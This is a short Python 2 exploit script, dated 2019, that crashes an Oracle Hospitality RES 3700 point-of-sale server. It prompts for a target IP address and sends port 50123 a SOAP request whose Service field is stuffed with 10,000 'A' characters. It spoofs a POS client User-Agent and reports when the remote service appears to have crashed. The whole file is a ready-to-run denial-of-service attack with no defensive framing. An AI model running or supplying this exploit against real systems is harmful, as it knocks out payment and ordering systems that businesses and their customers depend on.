#!/usr/bin/env python

#Author: Walid Faour
#Date: Aug. 25, 2019
#Oracle Hospitality RES 3700 Dos Exploit

import requests

print
print '---------------------------------------'
print 'Oracle Hospitality RES 3700 Dos Exploit'
print '---------------------------------------'
print

IP = raw_input("Enter the IP address: ")
URL = "http://" + IP + ":50123"
DoS = "A" * 10000

body = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
		<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
			<MCRS-ENV:Service>' + DoS + '</MCRS-ENV:Service> \
			<MCRS-ENV:Method></MCRS-ENV:Method> \
			<MCRS-ENV:SessionKey></MCRS-ENV:SessionKey> \
			<MCRS-ENV:InputParameters></MCRS-ENV:InputParameters> \
		</SOAP-ENV:Body> \
	</SOAP-ENV:Envelope>'
	
header = {
	"Content-Type" : "text/xml",
	"User-Agent" : "MDS POS Client",
	"Host" : IP + ":50123",
	"Content-Length" : str(len(body)),
	"Connection" : "Keep-Alive"
	}

print 'Sending DoS Exploit to Oracle Hospitality RES 3700 Server at IP address ' + IP + '...'
try:
	exploit = requests.post(URL,data=body,headers=header)
except requests.exceptions.ConnectionError:
	print 'Looks like Remote service crashed...'
